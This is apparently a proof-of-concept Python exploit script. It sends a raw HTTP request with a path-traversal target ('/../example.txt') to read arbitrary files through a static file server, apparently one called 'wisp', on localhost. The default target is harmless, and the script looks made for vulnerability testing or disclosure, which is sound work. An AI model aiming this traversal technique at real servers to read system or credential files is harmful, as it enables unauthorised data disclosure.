#!/usr/bin/env python3
"""
arbitrary file read through static file server.
"""
import argparse
import socket
import sys


def build_request(host, port, target):
    return (
        f"GET {target} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "User-Agent: nyoo\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("latin-1")


def fetch(host, port, request, timeout=5.0):
    with socket.create_connection((host, port), timeout) as sock:
        sock.sendall(request)
        chunks = []
        while True:
            # 64 kb of data 
            chunk = sock.recv(65536)
            if not chunk:
                break
            chunks.append(chunk)
    return b"".join(chunks)


def main():
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=6001)
    parser.add_argument("--target", default="/../example.txt",
                        help="raw request target")
    parser.add_argument("--raw", action="store_true", help="also dump the full raw response")
    args = parser.parse_args()

    request = build_request(args.host, args.port, args.target)

    print(f"[*] {args.host}:{args.port}")
    print("[*] request line:")
    print("    " + request.split(b"\r\n", 1)[0].decode("latin-1"))
    print()

    try:
        response = fetch(args.host, args.port, request)
    except ConnectionRefusedError:
        sys.exit(f"[!] nothing listening on {args.host}:{args.port}, start the wisp server if not already")
    except OSError as exc:
        sys.exit(f"[!] request failed: {exc}")

    head, _, body = response.partition(b"\r\n\r\n")
    status_line = head.split(b"\r\n", 1)[0].decode("latin-1")

    print("[*] response:")
    print("    " + status_line)
    for line in head.split(b"\r\n")[1:]:
        if line:
            print("    " + line.decode("latin-1"))
    print()
    print(f"[*] body ({len(body)} bytes):")
    print("-" * 60)
    print(body.decode("utf-8", errors="replace").rstrip("\n"))
    print("-" * 60)

    if args.raw:
        print()
        print("[*] raw response:")
        print(response.decode("utf-8", errors="replace"))

    if status_line.startswith("HTTP/1.1 200"):
        print(f"[+] {args.target} was served successfully")
        return 0

    print("[-] file not served, check that it points to something")
    return 1


if __name__ == "__main__":
    sys.exit(main())
